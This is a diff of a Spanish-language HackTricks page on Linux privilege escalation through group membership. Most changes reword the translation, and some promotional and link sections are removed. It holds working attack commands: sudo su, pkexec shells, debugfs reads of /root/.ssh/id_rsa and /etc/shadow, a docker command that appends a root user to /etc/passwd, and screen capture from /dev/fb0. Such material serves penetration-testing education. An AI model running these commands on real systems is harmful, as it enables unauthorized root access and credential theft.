@@ -1,18 +1,20 @@
-# Grupos Interesantes - Linux Privesc
+# Grupos Interesantes - Escalada de Privilegios en Linux
 
 <details>
 
-<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
+<summary><strong>Aprende hacking en AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Experto en Equipos Rojos de AWS de HackTricks)</strong></a><strong>!</strong></summary>
 
-* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
-* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Obtén el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
-* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
+Otras formas de apoyar a HackTricks:
+
+* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
+* Obtén el [**swag oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
+* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
+* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síguenos** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Comparte tus trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.
 
 </details>
 
-## Grupos Sudo/Admin
+## Grupos de Sudo/Administrador
 
 ### **PE - Método 1**
 
@@ -26,7 +28,7 @@
 ```
 Esto significa que **cualquier usuario que pertenezca al grupo sudo o admin puede ejecutar cualquier cosa como sudo**.
 
-Si este es el caso, para **convertirse en root solo es necesario ejecutar**:
+Si este es el caso, para **convertirse en root solo necesita ejecutar**:
 ```
 sudo su
 ```
@@ -36,13 +38,14 @@ Encuentra todos los binarios suid y verifica si está el binario **Pkexec**:
 ```bash
 find / -perm -4000 2>/dev/null
 ```
-Si encuentras que el binario **pkexec es un binario SUID** y perteneces a los grupos **sudo** o **admin**, probablemente puedas ejecutar binarios como sudo usando `pkexec`. Esto se debe a que típicamente esos son los grupos dentro de la **política de polkit**. Esta política básicamente identifica qué grupos pueden usar `pkexec`. Verifícalo con:
+Si descubres que el binario **pkexec es un binario SUID** y perteneces al grupo **sudo** o **admin**, probablemente podrías ejecutar binarios como sudo usando `pkexec`.\
+Esto se debe a que normalmente esos son los grupos dentro de la **política polkit**. Esta política básicamente identifica qué grupos pueden usar `pkexec`. Verifícalo con:
 ```bash
 cat /etc/polkit-1/localauthority.conf.d/*
 ```
 Allí encontrarás qué grupos tienen permiso para ejecutar **pkexec** y **por defecto** en algunas distribuciones de Linux aparecen los grupos **sudo** y **admin**.
 
-Para **convertirse en root se puede ejecutar**:
+Para **convertirte en root puedes ejecutar**:
 ```bash
 pkexec "/bin/sh" #You will be prompted for your user password
 ```
@@ -52,7 +55,7 @@ polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freed
 ==== AUTHENTICATION FAILED ===
 Error executing command as another user: Not authorized
 ```
-**No es porque no tengas permisos, sino porque no estás conectado sin una GUI**. Y hay una solución para este problema aquí: [https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). Necesitas **2 sesiones ssh diferentes**:
+**No es porque no tengas permisos, sino porque no estás conectado sin una GUI**. Y hay una solución alternativa para este problema aquí: [https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). Necesitas **2 sesiones de ssh diferentes**:
 
 {% code title="sesión1" %}
 ```bash
@@ -62,7 +65,7 @@ pkexec "/bin/bash" #Step 3, execute pkexec
 ```
 {% endcode %}
 
-{% code title="sesión2" %}
+{% code title="sesion2" %}
 ```bash
 pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
 #Step 4, you will be asked in this session to authenticate to pkexec
@@ -71,13 +74,13 @@ pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
 
 ## Grupo Wheel
 
-**A veces**, **por defecto** dentro del archivo **/etc/sudoers**, se puede encontrar esta línea:
+**A veces**, **por defecto** dentro del archivo **/etc/sudoers** puedes encontrar esta línea:
 ```
 %wheel	ALL=(ALL:ALL) ALL
 ```
 Esto significa que **cualquier usuario que pertenezca al grupo wheel puede ejecutar cualquier cosa como sudo**.
 
-Si este es el caso, para **convertirse en root solo hay que ejecutar**:
+Si este es el caso, para **convertirse en root solo tienes que ejecutar**:
 ```
 sudo su
 ```
@@ -89,7 +92,7 @@ Los usuarios del **grupo shadow** pueden **leer** el archivo **/etc/shadow**:
 ```
 ## Grupo de Disco
 
-Este privilegio es casi **equivalente al acceso de root** ya que se puede acceder a todos los datos dentro de la máquina.
+Este privilegio es casi **equivalente al acceso de root** ya que puedes acceder a todos los datos dentro de la máquina.
 
 Archivos: `/dev/sd[a-z][1-9]`
 ```bash
@@ -100,7 +103,7 @@ debugfs: ls
 debugfs: cat /root/.ssh/id_rsa
 debugfs: cat /etc/shadow
 ```
-Tenga en cuenta que utilizando debugfs también puede **escribir archivos**. Por ejemplo, para copiar `/tmp/asd1.txt` a `/tmp/asd2.txt`, puede hacer lo siguiente:
+Ten en cuenta que usando debugfs también puedes **escribir archivos**. Por ejemplo, para copiar `/tmp/asd1.txt` a `/tmp/asd2.txt` puedes hacer:
 ```bash
 debugfs -w /dev/sda1
 debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
@@ -115,24 +118,24 @@ USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
 yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
 moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
 ```
-El **tty1** significa que el usuario **yossi está conectado físicamente** a un terminal en la máquina.
+El grupo **tty1** significa que el usuario **yossi está conectado físicamente** a un terminal en la máquina.
 
-El grupo **video** tiene acceso para ver la salida de pantalla. Básicamente, se puede observar la pantalla. Para hacerlo, es necesario **capturar la imagen actual de la pantalla** en datos brutos y obtener la resolución que está utilizando la pantalla. Los datos de la pantalla se pueden guardar en `/dev/fb0` y se puede encontrar la resolución de esta pantalla en `/sys/class/graphics/fb0/virtual_size`.
+El grupo **video** tiene acceso para ver la salida de la pantalla. Básicamente, puedes observar las pantallas. Para hacer eso, necesitas **capturar la imagen actual en la pantalla** en datos sin procesar y obtener la resolución que la pantalla está utilizando. Los datos de la pantalla se pueden guardar en `/dev/fb0` y podrías encontrar la resolución de esta pantalla en `/sys/class/graphics/fb0/virtual_size`.
 ```bash
 cat /dev/fb0 > /tmp/screen.raw
 cat /sys/class/graphics/fb0/virtual_size
 ```
-Para **abrir** la **imagen cruda**, puedes usar **GIMP**, selecciona el archivo \*\*`screen.raw` \*\* y selecciona como tipo de archivo **Datos de imagen cruda**:
+Para **abrir** la **imagen cruda** puedes usar **GIMP**, selecciona el archivo \*\*`screen.raw` \*\* y elige como tipo de archivo **Datos de imagen cruda**:
 
 ![](<../../../.gitbook/assets/image (287) (1).png>)
 
-Luego modifica el Ancho y Alto a los que se usaron en la pantalla y verifica diferentes Tipos de Imagen (y selecciona el que muestre mejor la pantalla):
+Luego modifica el Ancho y Alto a los utilizados en la pantalla y verifica diferentes Tipos de Imagen (y selecciona el que muestre mejor la pantalla):
 
 ![](<../../../.gitbook/assets/image (288).png>)
 
 ## Grupo Root
 
-Parece que por defecto, **los miembros del grupo root** podrían tener acceso para **modificar** algunos archivos de configuración de **servicios** o algunos archivos de **bibliotecas** u **otras cosas interesantes** que podrían ser utilizadas para escalar privilegios...
+Parece que por defecto **los miembros del grupo root** podrían tener acceso para **modificar** algunos archivos de configuración de **servicios** o algunos archivos de **bibliotecas** u **otras cosas interesantes** que podrían ser utilizadas para escalar privilegios...
 
 **Verifica qué archivos pueden modificar los miembros de root**:
 ```bash
@@ -140,7 +143,7 @@ find / -group root -perm -g=w 2>/dev/null
 ```
 ## Grupo Docker
 
-Puedes **montar el sistema de archivos raíz de la máquina anfitriona en el volumen de una instancia**, por lo que cuando la instancia se inicia, carga inmediatamente un `chroot` en ese volumen. Esto te da efectivamente acceso root en la máquina.
+Puedes **montar el sistema de archivos raíz de la máquina anfitriona en el volumen de una instancia**, de modo que cuando la instancia se inicie, cargue inmediatamente un `chroot` en ese volumen. Esto te da efectivamente acceso de root en la máquina.
 ```bash
 docker image #Get images from the docker service
 
@@ -152,42 +155,12 @@ echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/pa
 #Ifyou just want filesystem and network access you can startthe following container:
 docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bashbash
 ```
-Finalmente, si no te gustan ninguna de las sugerencias anteriores o no funcionan por alguna razón (¿firewall de la API de Docker?), siempre puedes intentar **ejecutar un contenedor privilegiado y escapar de él** como se explica aquí:
-
-{% content-ref url="../docker-security/" %}
-[seguridad de Docker](../docker-security/)
-{% endcontent-ref %}
-
-Si tienes permisos de escritura sobre el socket de Docker, lee [**esta publicación sobre cómo escalar privilegios abusando del socket de Docker**](../#writable-docker-socket)**.**
-
-{% embed url="https://github.com/KrustyHack/docker-privilege-escalation" %}
-
-{% embed url="https://fosterelli.co/privilege-escalation-via-docker.html" %}
-
 ## Grupo lxc/lxd
 
-{% content-ref url="./" %}
-[.](./)
-{% endcontent-ref %}
-
-## Grupo Adm
-
-Por lo general, los **miembros** del grupo **`adm`** tienen permisos para **leer archivos de registro** ubicados dentro de _/var/log/_.\
-Por lo tanto, si has comprometido a un usuario dentro de este grupo, definitivamente deberías **echar un vistazo a los registros**.
+Los **miembros** del grupo **`adm`** generalmente tienen permisos para **leer archivos de registro** ubicados dentro de _/var/log/_.\
+Por lo tanto, si has comprometido a un usuario dentro de este grupo, definitivamente deberías echar un **vistazo a los registros**.
 
 ## Grupo Auth
 
-Dentro de OpenBSD, el grupo **auth** generalmente puede escribir en las carpetas _**/etc/skey**_ y _**/var/db/yubikey**_ si se usan.\
+Dentro de OpenBSD, el grupo **auth** generalmente puede escribir en las carpetas _**/etc/skey**_ y _**/var/db/yubikey**_ si se utilizan.\
 Estos permisos pueden ser abusados con el siguiente exploit para **escalar privilegios** a root: [https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)
-
-<details>
-
-<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
-
-* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
-* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Obtén el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
-* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Comparte tus trucos de hacking enviando PR al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
-
-</details>
